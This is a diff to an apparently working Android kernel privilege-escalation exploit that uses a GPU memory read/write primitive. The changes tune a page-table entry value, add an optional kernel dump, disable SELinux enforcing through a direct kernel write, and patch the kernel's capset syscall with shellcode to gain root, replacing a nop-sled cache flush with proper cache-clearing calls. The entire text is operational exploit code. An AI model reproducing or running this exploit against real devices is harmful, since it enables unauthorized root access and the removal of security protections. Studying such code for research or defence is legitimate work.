@@ -383,8 +383,9 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     // pxn=1 << 53 ??
     // uxn=1 << 54
     // nonSecure = 1 << 55
-    // so we want MT_NORMAL on 5.10, which has index 0, so 0xe8000000000751
-    uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000751;
+    // we want MT_NORMAL on 5.10, which has AttrIndx index 0 (Checked: 5.10 (in qemu) kernel is mapped with 0x004400004020078)
+    // so need to change AttrIndx to 0: 0xe8000000000741
+    uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000741;
     //uint64_t tramp_pte_value = 0x41414141;
 
     // from Adrenaline: spray physical memory
@@ -674,11 +675,11 @@ int main() {
 
     void* kernel_copy_buf = malloc(kernel_size);
     memcpy(kernel_copy_buf, kernel_physical_base, kernel_size);
-#if 0
-    FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
-    fwrite(kernel_copy_buf, 1, kernel_size, f);
-    fclose(f);
-#endif
+    if (getenv("CHEESE_DUMP_KERNEL")) {
+        FILE* f = fopen("/data/local/tmp/kernel_dump", "w");
+        fwrite(kernel_copy_buf, 1, kernel_size, f);
+        fclose(f);
+    }
 
     struct cheese_kallsyms_lookup kallsyms_lookup;
     if (cheese_create_kallsyms_lookup(&kallsyms_lookup, kernel_copy_buf, kernel_size)) {
@@ -697,6 +698,7 @@ int main() {
     fprintf(stderr, "%lx: %p\n", (kernel_selinux_state_addr - kernel_virtual_base), kernel_selinux_state_enforcing_ptr);
     *kernel_selinux_state_enforcing_ptr = false;
     fprintf(stderr, "set selinux enforcing ptr...\n");
+    __builtin___clear_cache((char*)kernel_selinux_state_enforcing_ptr, (char*)kernel_selinux_state_enforcing_ptr + sizeof(bool));
 
     uint64_t init_cred_addr = cheese_kallsyms_lookup(&kallsyms_lookup, "init_cred");
     if (force_manual_patchfinder || !init_cred_addr) {
@@ -737,20 +739,9 @@ int main() {
     fprintf(stderr, "patch...\n");
     stupid_memcpy(kernel___do_sys_capset_ptr, shellcode, sizeof(shellcode));
 
-    sleep(1);
-    // stupidest cache flush: write and run 16MB of nops.
-    {
-        uint32_t dumb_cache_flush_size = 0x1000000;
-        void* garbage = mmap(NULL, dumb_cache_flush_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
-        volatile uint32_t* garbage_instrs = garbage;
-        for (int i = 0; i < (dumb_cache_flush_size / 4) - 1; i++) {
-            garbage_instrs[i] = 0xd503201f; // nop
-        }
-        garbage_instrs[(dumb_cache_flush_size / 4) - 1] = 0xD65F03C0; // ret
-        void (*garbage_fn)(void) = garbage;
-        garbage_fn();
-        munmap(garbage, dumb_cache_flush_size);
-    }
+    // https://developer.arm.com/documentation/101430/0102/Functional-description/L1-memory-system/About-the-L1-memory-system/L1-instruction-side-memory-system
+    // "behaves as a PIPT cache" - flushing this will flush all copies sharing same physical memory
+    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(shellcode));
 
     fprintf(stderr, "call...\n");
     /* Calling our patched version of sys_capset */
@@ -766,6 +757,7 @@ int main() {
     fprintf(stderr, "restore...\n");
     /* Restoring sys_capset */
     stupid_memcpy(kernel___do_sys_capset_ptr, sys_capset, sizeof(sys_capset));
+    __builtin___clear_cache(kernel___do_sys_capset_ptr, kernel___do_sys_capset_ptr + sizeof(sys_capset));
     fprintf(stderr, "restored...\n");
     if (getuid() != 0) {
         fprintf(stderr, "failed to get root - rerun?\n");
